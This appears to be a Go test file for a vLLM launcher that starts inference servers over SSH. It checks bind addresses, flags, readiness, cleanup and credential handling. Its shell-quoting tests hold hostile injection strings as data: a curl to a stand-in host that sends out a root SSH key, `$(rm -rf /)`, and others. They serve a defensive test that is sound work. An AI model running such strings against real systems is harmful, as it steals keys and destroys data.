// Copyright (C) 2026 Sovrenix Inc.
// SPDX-License-Identifier: GPL-3.0-or-later

package vllm

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"testing"

	"go.sovrenix.com/larri/internal/core"
	"go.sovrenix.com/larri/internal/runtime"
	"go.sovrenix.com/larri/internal/secret"
)

type recSession struct {
	mu   sync.Mutex
	cmds []string
	fail bool
}

func (s *recSession) Run(_ context.Context, cmd string) ([]byte, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.cmds = append(s.cmds, cmd)
	if s.fail {
		return []byte("boom"), fmt.Errorf("command failed")
	}
	return nil, nil
}
func (s *recSession) Dial(context.Context, int) (io.ReadWriteCloser, error) { return nil, nil }
func (s *recSession) Close() error                                          { return nil }

func (s *recSession) last() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if len(s.cmds) == 0 {
		return ""
	}
	return s.cmds[len(s.cmds)-1]
}

func spec() core.ModelSpec {
	return core.ModelSpec{
		Ref: "Qwen/Qwen3-Coder-30B", ServedName: "qwen3-coder", Quantization: "fp16",
	}
}

func plan() core.SizingPlan {
	return core.SizingPlan{ContextLen: 32768, GPUMemUtilization: 0.86, TensorParallelSize: 1}
}

// FR-SEC-08, and the specific shape it takes with Docker: `-p 8000:8000`
// publishes on every interface. On a machine with a routable address that is
// an unauthenticated inference server anyone can find, so the bind address is
// written explicitly on both sides of the mapping.
func TestLaunchPublishesOnLoopbackOnly(t *testing.T) {
	r := New()
	r.launcher = "vllm serve"
	ep := runtime.Endpoint{Host: runtime.Loopback, Port: RemotePort,
		Model: "qwen3-coder", Key: secret.New("rig-token")}
	cmd := r.launchCommand(spec(), plan(), ep)

	if !strings.Contains(cmd, "--host '127.0.0.1'") {
		t.Errorf("vllm must bind loopback:\n%s", cmd)
	}
	if strings.Contains(cmd, "0.0.0.0") {
		t.Error("no routable bind address may appear anywhere in the launch")
	}
}

func TestLaunchCarriesPlanAndKey(t *testing.T) {
	r := New()
	r.launcher = "vllm serve"
	ep := runtime.Endpoint{Host: runtime.Loopback, Port: RemotePort,
		Model: "qwen3-coder", Key: secret.New("rig-token")}
	cmd := r.launchCommand(spec(), plan(), ep)

	for _, want := range []string{
		"--max-model-len '32768'",
		"--gpu-memory-utilization '0.86'",
		"--served-model-name 'qwen3-coder'",
		"--api-key 'rig-token'",
		// `vllm serve` takes the model positionally; only the module
		// entrypoint wants --model, which is why the launcher is discovered
		// rather than assumed.
		"vllm serve 'Qwen/Qwen3-Coder-30B'",
	} {
		if !strings.Contains(cmd, want) {
			t.Errorf("launch missing %q:\n%s", want, cmd)
		}
	}
	// fp16 is not a quantisation flag; passing it would make vLLM reject the
	// launch after the operator has paid to boot.
	if strings.Contains(cmd, "--quantization") {
		t.Errorf("fp16 must not be passed as a quantisation:\n%s", cmd)
	}
}

// A model reference reaches a remote shell. One containing a quote or a
// semicolon would otherwise be command injection on a machine LARRI holds root
// on.
//
// Verified by handing the quoted value to a real shell and checking what comes
// back, rather than by pattern-matching the command string. Substring checks
// are the wrong tool here: the dangerous text legitimately appears inside the
// safely-quoted word, so a grep for it reports a vulnerability that is not
// there while missing quoting that actually breaks.
func TestShellQuotingSurvivesARealShell(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("no shell available")
	}
	hostile := []string{
		`x'; curl http://evil.example/$(cat /root/.ssh/id_ed25519); echo '`,
		`$(rm -rf /)`,
		"`whoami`",
		`a"b`,
		`back\slash`,
		`semi;colon && and || or`,
		`newline
inside`,
	}
	for _, in := range hostile {
		out, err := exec.Command("sh", "-c", "printf %s "+shellQuote(in)).Output()
		if err != nil {
			t.Errorf("shell rejected %q: %v", in, err)
			continue
		}
		if string(out) != in {
			t.Errorf("quoting altered the value:\n  in:  %q\n  out: %q", in, string(out))
		}
	}
}

// The whole launch must parse as the argument vector intended, with a hostile
// model reference arriving as exactly one word.
func TestHostileModelRefStaysOneArgument(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("no shell available")
	}
	r := New()
	r.launcher = "vllm serve"
	evil := spec()
	evil.Ref = `x'; touch /tmp/larri-pwned; echo '`
	cmd := r.launchCommand(evil, plan(), runtime.Endpoint{
		Host: runtime.Loopback, Port: RemotePort, Key: secret.New("k")})

	// Replace the launcher with a printf that echoes its arguments one per
	// line, so the real argument boundaries are observable.
	probe := strings.Replace(cmd, "nohup vllm serve", `printf '%s\n'`, 1)
	probe = probe[strings.Index(probe, "printf"):]
	if i := strings.Index(probe, " >"); i > 0 {
		probe = probe[:i] // drop the redirect and backgrounding
	}
	out, err := exec.Command("sh", "-c", probe).Output()
	if err != nil {
		t.Fatalf("probe failed: %v", err)
	}
	got := strings.Split(strings.TrimRight(string(out), "\n"), "\n")
	found := false
	for _, arg := range got {
		if arg == evil.Ref {
			found = true
		}
		if strings.HasPrefix(arg, "touch") {
			t.Fatalf("injection escaped into its own argument: %q", arg)
		}
	}
	if !found {
		t.Errorf("model ref did not survive as one argument; got %q", got)
	}
}

// §6.6: tool calling is a launch-time property, and a runtime started without
// it accepts tools[] then answers in prose — which reads as a bad model rather
// than a missing flag.
func TestToolCallingIsALaunchFlag(t *testing.T) {
	r := New()
	r.launcher = "vllm serve"
	ep := runtime.Endpoint{Host: runtime.Loopback, Port: RemotePort, Key: secret.New("k")}

	off := r.launchCommand(spec(), plan(), ep)
	if strings.Contains(off, "--enable-auto-tool-choice") {
		t.Error("tool calling must not be enabled without a parser")
	}
	s := spec()
	s.ToolCalling = core.Allow
	s.ToolParser = "hermes"
	on := r.launchCommand(s, plan(), ep)
	if !strings.Contains(on, "--enable-auto-tool-choice") ||
		!strings.Contains(on, "--tool-call-parser 'hermes'") {
		t.Errorf("tool calling should be enabled at launch:\n%s", on)
	}
}

// NFR-05: readiness is a completion round-trip. A listening socket and a 200
// on /health both pass while an under-sized rig still cannot produce a token.
func TestReadyRequiresACompletion(t *testing.T) {
	var gotAuth, gotPath string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth, gotPath = r.Header.Get("Authorization"), r.URL.Path
		fmt.Fprint(w, `{"id":"x","model":"qwen3-coder","choices":[
		  {"message":{"role":"assistant","content":"pong"},"finish_reason":"length"}],
		  "usage":{"total_tokens":2}}`)
	}))
	defer srv.Close()

	if err := New().Ready(context.Background(), endpointOf(t, srv.URL, "rig-token"), spec()); err != nil {
		t.Fatalf("a real completion should satisfy readiness: %v", err)
	}
	if gotPath != "/v1/chat/completions" {
		t.Errorf("path = %s; readiness must exercise the completion route", gotPath)
	}
	if gotAuth != "Bearer rig-token" {
		t.Errorf("auth = %q; the rig credential must be presented", gotAuth)
	}
}

// The failure this exists to catch: the port is open, the server answers, and
// no completion comes back.
func TestOpenPortWithNoChoicesIsNotReady(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, `{"id":"x","model":"m","choices":[]}`)
	}))
	defer srv.Close()
	if err := New().Ready(context.Background(), endpointOf(t, srv.URL, "k"), spec()); err == nil {
		t.Fatal("a response with no choices must not count as ready")
	}
}

func TestReadyPropagatesServerErrors(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprint(w, `{"error":"engine not initialised"}`)
	}))
	defer srv.Close()
	err := New().Ready(context.Background(), endpointOf(t, srv.URL, "k"), spec())
	if err == nil {
		t.Fatal("a 500 is not readiness")
	}
	if !strings.Contains(err.Error(), "engine not initialised") {
		t.Errorf("the server's reason should survive: %v", err)
	}
}

func TestStopHaltsTheServerProcess(t *testing.T) {
	s := &recSession{}
	if err := New().Stop(context.Background(), s); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(s.last(), "pkill") {
		t.Errorf("stop = %q", s.last())
	}
	if strings.Contains(s.last(), "docker") {
		t.Error("a Vast instance IS the container; there is no docker inside it")
	}
}

// The design error that failed every live bring-up: a Vast instance is the
// container, so `docker pull` inside it is docker-in-docker against no daemon.
// It surfaced as `docker: command not found`, which reads like a network
// problem until you notice the instance was never a VM.
func TestNothingSpeaksDockerOnTheHost(t *testing.T) {
	r := New()
	r.launcher = "vllm serve"
	cmd := r.launchCommand(spec(), plan(), runtime.Endpoint{
		Host: runtime.Loopback, Port: RemotePort, Key: secret.New("k")})
	if strings.Contains(cmd, "docker") {
		t.Errorf("launch still speaks docker:\n%s", cmd)
	}
	// The server has to outlive the SSH exec channel that started it.
	if !strings.Contains(cmd, "nohup") {
		t.Errorf("launch must detach, or the server dies with the session:\n%s", cmd)
	}
	if !strings.Contains(cmd, LogPath) {
		t.Errorf("launch must capture output for diagnosis:\n%s", cmd)
	}
	// Re-launching must not leave two servers fighting for one GPU.
	// Idempotency lives in a separate stop command, not here.
}

// Images package vLLM differently, so the launcher is discovered rather than
// assumed. Assuming one shape is how a bring-up fails on a host that was fine.
func TestLauncherIsDiscoveredNotAssumed(t *testing.T) {
	r := New()
	r.launcher = "python3 -m vllm.entrypoints.openai.api_server --model"
	cmd := r.launchCommand(spec(), plan(), runtime.Endpoint{
		Host: runtime.Loopback, Port: RemotePort, Key: secret.New("k")})
	if !strings.Contains(cmd, "python3 -m vllm.entrypoints.openai.api_server --model '") {
		t.Errorf("module entrypoint not honoured:\n%s", cmd)
	}
	r.launcher = "vllm serve"
	cmd = r.launchCommand(spec(), plan(), runtime.Endpoint{
		Host: runtime.Loopback, Port: RemotePort, Key: secret.New("k")})
	if !strings.Contains(cmd, "vllm serve '") {
		t.Errorf("console script not honoured:\n%s", cmd)
	}
}

func endpointOf(t *testing.T, rawurl, key string) runtime.Endpoint {
	t.Helper()
	u, err := url.Parse(rawurl)
	if err != nil {
		t.Fatal(err)
	}
	port, _ := strconv.Atoi(u.Port())
	return runtime.Endpoint{Host: u.Hostname(), Port: port,
		Model: "qwen3-coder", Key: secret.New(key)}
}

// A gated repository needs a credential at launch, and the credential must not
// end up in the server's argv where `ps` would show it to anything on the box.
func TestHuggingFaceTokenIsExportedNotArgv(t *testing.T) {
	r := New()
	r.launcher = "vllm serve"
	r.SetHuggingFaceToken(secret.New("hf_gatedtoken"))
	cmd := r.launchCommand(spec(), plan(), runtime.Endpoint{
		Host: runtime.Loopback, Port: RemotePort, Key: secret.New("k")})

	if !strings.Contains(cmd, "export HF_TOKEN='hf_gatedtoken'") {
		t.Errorf("token should be exported into the shell:\n%s", cmd)
	}
	// It must not appear after the launcher, which is what ends up in argv.
	launchPart := cmd[strings.Index(cmd, "nohup"):]
	if strings.Contains(launchPart, "hf_gatedtoken") {
		t.Errorf("token leaked into the server's argv:\n%s", launchPart)
	}
}

func TestNoTokenMeansNoExport(t *testing.T) {
	r := New()
	r.launcher = "vllm serve"
	cmd := r.launchCommand(spec(), plan(), runtime.Endpoint{
		Host: runtime.Loopback, Port: RemotePort, Key: secret.New("k")})
	if strings.Contains(cmd, "HF_TOKEN") {
		t.Errorf("an unset token should not appear at all:\n%s", cmd)
	}
}

// The bug that killed run 5's launches, and the reason it is subtle: `pkill -f`
// matches the full command line of every process, including the shell issuing
// the command — whose argv necessarily contains the binary name, because the
// launch that follows names it. So the cleanup killed its own parent and the
// host reported `exited with status 143 from signal TERM`.
//
// The test is the real property rather than the spelling: every pkill pattern
// in the command, treated as a regex, must NOT match the command itself.
func TestCleanupPatternsDoNotMatchTheirOwnCommand(t *testing.T) {
	// The stop is a command of its own, which is half the fix: a single
	// command that both greps for the binary and then launches it contains
	// the literal target text, so the pattern matches the issuing shell no
	// matter how it is spelled.
	cmd := stopServersCmd
	patterns := regexp.MustCompile(`pkill -f '([^']+)'`).FindAllStringSubmatch(cmd, -1)
	if len(patterns) == 0 {
		t.Fatal("expected a cleanup pattern")
	}
	for _, m := range patterns {
		re, err := regexp.Compile(m[1])
		if err != nil {
			t.Errorf("pattern %q is not a valid regex: %v", m[1], err)
			continue
		}
		if re.MatchString(cmd) {
			t.Errorf("pkill pattern %q matches the command that issues it, "+
				"so it would kill its own shell:\n%s", m[1], cmd)
		}
	}
}

// The pattern still has to match a real server, or the cleanup does nothing and
// two servers end up fighting for one GPU.
func TestCleanupPatternsStillMatchARunningServer(t *testing.T) {
	cmd := stopServersCmd
	// What a live server's command line actually looks like.
	running := []string{
		"vllm serve Qwen/Qwen2.5-1.5B-Instruct --host 127.0.0.1 --port 8000",
		"python3 -m vllm.entrypoints.openai.api_server --model Qwen/Qwen2.5-1.5B",
	}
	patterns := regexp.MustCompile(`pkill -f '([^']+)'`).FindAllStringSubmatch(cmd, -1)
	for _, target := range running {
		matched := false
		for _, m := range patterns {
			if re, err := regexp.Compile(m[1]); err == nil && re.MatchString(target) {
				matched = true
			}
		}
		if !matched {
			t.Errorf("no cleanup pattern matches a running server: %q", target)
		}
	}
}

// And the launch must not carry a cleanup at all, since that is what made the
// pattern unavoidably self-matching.
func TestLaunchDoesNotKillAnything(t *testing.T) {
	r := New()
	r.launcher = "vllm serve"
	cmd := r.launchCommand(spec(), plan(), runtime.Endpoint{
		Host: runtime.Loopback, Port: RemotePort, Key: secret.New("k")})
	if strings.Contains(cmd, "pkill") {
		t.Errorf("the launch must not also kill; that is a separate command:\n%s", cmd)
	}
}

// The floor that let a V100 through is vLLM's minimum to run at all (7.0);
// bfloat16 needs 8.0. vLLM takes its dtype from the model config, and current
// releases overwhelmingly say bfloat16 — so a Volta rig passes selection,
// pulls tens of gigabytes of weights, and only then refuses to load them. A
// real `larri up` selected an 8x V100 box for a bf16 Qwen and would have paid
// for exactly that.
func TestPreAmpereHardwareGetsAnExplicitFloat16(t *testing.T) {
	cases := []struct {
		name  string
		cap   int
		quant string
		want  bool
	}{
		{"volta bf16 weights", 700, "bf16", true},
		{"turing unquantised", 750, "", true},
		{"ampere needs nothing", 800, "bf16", false},
		{"ada needs nothing", 890, "", false},
		{"quantised carries its own type", 700, "awq", false},
		{"unknown hardware is left alone", 0, "bf16", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := New()
			cmd := r.launchCommand(
				core.ModelSpec{Ref: "Qwen/Qwen3-27B", ServedName: "m", Quantization: tc.quant},
				core.SizingPlan{ComputeCapability: tc.cap},
				runtime.Endpoint{Key: secret.New("k")},
			)
			if got := strings.Contains(cmd, "--dtype 'float16'"); got != tc.want {
				t.Errorf("--dtype float16 present = %v, want %v\ncommand: %s", got, tc.want, cmd)
			}
		})
	}
}
